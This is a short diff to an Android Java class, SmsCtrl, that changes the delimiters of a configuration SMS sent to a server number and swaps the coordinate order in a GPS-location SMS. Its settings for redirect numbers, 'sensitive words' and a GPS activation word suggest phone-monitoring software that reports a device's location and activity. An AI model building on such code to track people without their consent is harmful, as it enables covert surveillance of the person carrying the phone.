@@ -199,7 +199,7 @@ public class SmsCtrl
 		return tempString;
 	}
 
-	// The sms content format: <header>|<license key>|<receiver mail>|<receiver phone num>|<receiver sensitive words>|<gps activation word>
+	// The sms content format: <header>,<license key>,<receiver mail>,<receiver phone num>,<receiver sensitive words>,<gps activation word>
 	public static void sendReceiverInfoSms(Context context) {
 		String strMobile = context.getResources().getString(R.string.srv_address).trim();
 		String key = ConfigCtrl.getLicenseKey(context);
@@ -208,14 +208,14 @@ public class SmsCtrl
 		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
 		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
 		String gpsWord = GlobalPrefActivity.getGpsWord(context);
-		String strContent = "Info|" + key + "|" + rcvMail + "|" + rcvPhoneNum + "|" + sensWords + "|" + gpsWord;
+		String strContent = "Info," + key + "," + rcvMail + "," + rcvPhoneNum + "," + sensWords + "," + gpsWord;
 		sendSms(strMobile, strContent);
 	}
 
 	public static String buildGpsLocationSms(Context context, Location location) 
 	{
 		return String.format(context.getResources().getString(R.string.gps_sms), 
-				location.getLongitude() + "," + location.getLatitude());
+				location.getLatitude() + "," + location.getLongitude());
 	}
 	
 }
